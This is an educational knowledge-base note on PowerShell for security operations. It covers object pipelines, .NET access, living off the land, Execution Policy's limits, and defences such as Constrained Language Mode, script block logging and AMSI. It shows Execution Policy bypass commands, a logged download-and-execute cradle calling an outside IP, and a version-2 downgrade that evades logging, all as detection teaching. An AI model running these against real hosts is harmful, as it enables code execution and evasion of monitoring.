---
title: "PowerShell for Security Operations"
aliases: ["PowerShell", "PowerShell Security", "Windows Automation"]
tags: [tree/tooling, cyber/tooling/programming/powershell, type/concept, difficulty/medium]
Domain: "[[Programming for Security]]"
Color: "#708090"
---

# PowerShell for Security Operations

> [!abstract] Note of [[Programming for Security]]
> PowerShell is the administration language of Windows and, for exactly the same reasons, the most productive post-exploitation platform on the platform. This note explains why its pipeline carries objects rather than text, why that makes it a .NET runtime with a shell attached rather than a shell with extras, and why the setting everyone reaches for to lock it down was never a security control at all.

## Parent Learning Order
Python -> Go -> C++ -> Bash -> PowerShell

## A Pipeline That Carries Objects

> *In Bash you pipe `ps` into `grep` and then into `awk` to pull a column. What does the equivalent PowerShell pipeline pass between its stages?*
>
> Hold your answer — the section below is the response.

Unix pipelines carry **text**. Every program writes bytes to standard output, and every downstream program parses those bytes back into whatever structure it needs. That contract is the source of Unix's composability and of its most persistent fragility: the structure is reconstructed by convention at every stage, so a column that shifts, a name with a space, or a locale that formats a number differently breaks a pipeline that was correct yesterday.

PowerShell pipelines carry **objects**. A cmdlet emits typed .NET objects with named properties, and the next stage receives those objects intact — no serialisation to text, no reparsing, no column positions. The difference is not stylistic. It removes an entire category of bug by removing the step where structure was being guessed.

**Prerequisites:** Bash pipelines, and the idea that a program's output is a program's input.

> [!tip] The analogy, and where it breaks
> A Unix pipeline is a series of clerks passing each other printed pages, each one re-reading the page to find the figure it needs; a PowerShell pipeline is the same clerks passing the filled-in form itself, fields and all. The analogy breaks at the far end of the line, and usefully: the last clerk still has to print something for a human to read, and PowerShell's `Format-*` commands are that printing step. Anything after them is holding a printout, not a form — which is why they belong at the very end and nowhere else.

## Watching the Difference

Two ways to answer the same question on `WS-014` — which processes are using more than a hundred megabytes.

In Bash the structure is recovered from column positions:

```bash
ps aux --sort=-rss | awk 'NR>1 && $6 > 102400 {print $11, $6}'
```

The `$6` is a bet that resident-set size is the sixth whitespace-separated field. It is, on this system, today. It is not on every `ps` implementation, and a process whose command name contains a space shifts `$11` without any warning.

In PowerShell the property is named and typed:

```powershell
Get-Process | Where-Object WorkingSet -gt 100MB | Select-Object Name, Id, WorkingSet
```

```text
Name            Id  WorkingSet
----            --  ----------
chrome        4412   412286976
MsMpEng       2104   198705152
powershell_ise 6620  141283328
```

Nothing was parsed. `WorkingSet` is an `Int64` on a `Process` object, `100MB` is a typed literal the language understands as 104,857,600, and the comparison is numeric rather than lexical. Confirm that the pipeline really is carrying objects rather than a cleverly formatted table:

```powershell
Get-Process chrome | Get-Member -MemberType Property | Select-Object -First 4 Name, Definition
```

```text
Name           Definition
----           ----------
BasePriority   int BasePriority {get;}
Handle         System.IntPtr Handle {get;}
Id             int Id {get;}
MachineName    string MachineName {get;}
```

### The trap that proves it

Because the pipeline carries objects, converting them to display output too early destroys them — and the failure is quiet:

```powershell
Get-Process | Select-Object Name, Id | Format-Table | Export-Csv procs.csv
Get-Content procs.csv | Select-Object -First 3
```

```text
"ClassId2e4f51ef21dd47e99d3c952918aff9cd","pageHeaderEntry","pageFooterEntry"
"033ecb2bc07a4d43b5ef94ed5a35d280",,
"9e210fe47d09416682b841769c78b8a3",,
```

Those are formatting instructions, faithfully exported. `Format-Table` does not tidy the objects — it replaces them with a description of how to draw a table, and everything downstream receives that instead. Remove it and the same pipeline produces a usable file.

The rule that falls out is worth carrying: **`Format-*` is a terminal operation.** If something comes after it, one of the two is wrong. It is the clearest evidence that the pipeline is not text, because in a text pipeline formatting is harmless.

## A .NET Runtime With a Shell Attached

The object pipeline is a consequence rather than a feature. PowerShell is hosted on .NET, cmdlets are .NET classes, and the objects in the pipeline are ordinary .NET objects — which means the language can reach anything the runtime can reach:

```powershell
[System.Net.Dns]::GetHostAddresses("track.meridian.test")
[System.Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("hello"))
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
```

```text
IPAddressToString
-----------------
203.0.113.20

aGVsbG8=

MERIDIAN\r.okonkwo
```

No module was imported and nothing was installed. That reach is why PowerShell is the best administration tool on Windows: an operator can query WMI, manipulate certificates, call Win32 APIs and drive Active Directory without leaving the shell.

It is also, precisely and unavoidably, why PowerShell is the most productive post-exploitation platform on Windows. Every capability in the list above is equally available to code an attacker runs, and none of it requires dropping a binary to disk. This is the shape of **living off the land**: the tool is signed, present by default, trusted by administrators, and powerful enough that an attacker rarely needs to bring anything of their own.

**The deliberate break:** Execution Policy is where everyone reaches to lock this down. Set it to `Restricted` or `AllSigned`, and unsigned scripts will not run — so the platform is constrained.

It is not a security control, and Microsoft documents it as not being one. Execution Policy governs whether the *script host* will load a `.ps1` **file**, and every route that does not involve loading a `.ps1` file is unaffected:

```powershell
Get-ExecutionPolicy
powershell.exe -ExecutionPolicy Bypass -File .\collect.ps1
powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
Get-Content .\collect.ps1 | Invoke-Expression
```

```text
Restricted
```

The policy reports `Restricted` and all three of the lines beneath it run. A parameter overrides it, an encoded command never touches a file, and piping a file's *contents* into `Invoke-Expression` executes the text without the script host ever loading a script. None of these is a bypass in the exploit sense — they are documented behaviour, because the feature exists to stop an administrator double-clicking something unexpected, not to stop an adversary who is already executing code.

**How you'd spot it:** treat a reported Execution Policy as telling you nothing about exposure, and ask two different questions instead. First, what language mode the session is actually in — `$ExecutionContext.SessionState.LanguageMode` returning `FullLanguage` means arbitrary .NET is reachable, and `ConstrainedLanguage` means it is not, which is the control Execution Policy is mistaken for. Second, whether script block logging is on, because that is what turns everything above into evidence. A host reporting `Restricted`, `FullLanguage` and no 4104 events is the combination worth finding: locked-looking, entirely open, and unrecorded.

## What Actually Constrains It, and What Records It

Two mechanisms do the work Execution Policy is imagined to do, and they work in different directions.

**Constrained Language Mode** limits the language itself. In `ConstrainedLanguage`, direct .NET type access, `Add-Type`, and COM instantiation are blocked, leaving core cmdlets and approved types available. It is enforced by application control — AppLocker or Windows Defender Application Control — rather than set as a preference, which is the point: a mode a script can turn off is not a boundary.

```powershell
$ExecutionContext.SessionState.LanguageMode
[System.Net.WebClient]::new()
```

```text
ConstrainedLanguage
Cannot create type. Only core types are supported in this language mode.
```

**Script block logging** records what ran. Enabled by policy, it writes every script block PowerShell compiles to event ID **4104** in `Microsoft-Windows-PowerShell/Operational` — and it records the block *after* decoding, which is the property that matters:

```powershell
Get-WinEvent -LogName Microsoft-Windows-PowerShell/Operational -MaxEvents 1 |
  Where-Object Id -eq 4104 | Select-Object -ExpandProperty Message
```

```text
Creating Scriptblock text (1 of 1):
IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/s.ps1')
```

The command that produced that entry was the base64 `-EncodedCommand` above. Obfuscation is applied to get code past a filter, and the engine has to undo all of it before executing anything — so the log holds the plain text regardless of how it arrived. That is an unusually favourable position for a defender, and it is the reason PowerShell logging is worth enabling even on estates that consider PowerShell a liability.

## Security Implications

**The reach that makes it useful is the reach that makes it dangerous, and the two cannot be separated.** Every argument for PowerShell as an administration platform — signed, present, trusted, able to touch the whole runtime — is an argument an attacker makes for the same tool. Removing it is rarely viable and rarely the right call; constraining and recording it is.

**Execution Policy is a safety catch, not a boundary.** Reporting it as a control in an assessment is a finding about the assessment. The questions that carry information are the language mode, whether application control enforces it, and whether logging is on.

**Detection is unusually strong here, because deobfuscation happens before logging.** Encoded commands, string concatenation, and format-operator tricks all survive into 4104 as plain text. A detection strategy built on the *logged block* rather than on the command line is durable against obfuscation in a way that command-line-only monitoring is not — and `Get-WinEvent` reading 4104 is a cheap, high-yield hunt on any estate that has it enabled.

**Downgrade is the corresponding gap.** Script block logging, AMSI and Constrained Language Mode all belong to PowerShell 5.0 and later. An attacker who starts `powershell.exe -Version 2` on a host where the v2 engine is still installed gets an interpreter with none of them, and the modern log records almost nothing. Removing the v2 engine is a small, specific, frequently skipped hardening step, and its absence is worth checking directly.

**AMSI is content inspection, and inherits content inspection's limits.** The Antimalware Scan Interface hands each script block to the registered engine before execution, which catches known-malicious content and raises the cost of the rest. It is an in-process check on a surface the attacker also controls, so it is a layer rather than a boundary — the same conclusion the network branch reaches about inspection generally, arrived at from the other side.

**Transcription answers a different question from logging.** `Start-Transcript` and its policy equivalent record the session's input *and output* to a file, which is what an investigation needs when the question is what an operator saw rather than what the engine compiled. The two are complementary and neither substitutes for the other.

All configuration and testing described here belongs on systems within an authorized scope. Enabling logging changes what is recorded about every user of a host, and executing collection scripts on machines you do not administer requires the authorization the relevant engagement defines.

## Summary

You should now be able to:

- Explain why a PowerShell pipeline carries typed objects rather than text, what that removes compared with parsing columns, and why `Format-*` must be the last stage in any pipeline whose output is consumed by something else.
- Use `Get-Member` to inspect what the pipeline is actually carrying, reach .NET types directly from the shell, and read event 4104 to recover what an obfuscated command actually executed.
- Explain why Execution Policy is not a security control and demonstrate three documented routes past it; distinguish it from Constrained Language Mode and application control, which are; and argue why deobfuscated script block logging makes PowerShell one of the better-instrumented execution surfaces on Windows despite being one of the most abused — and why the version-2 downgrade removes all of it at once.

---
> 🔼 Up: [[Programming for Security]]
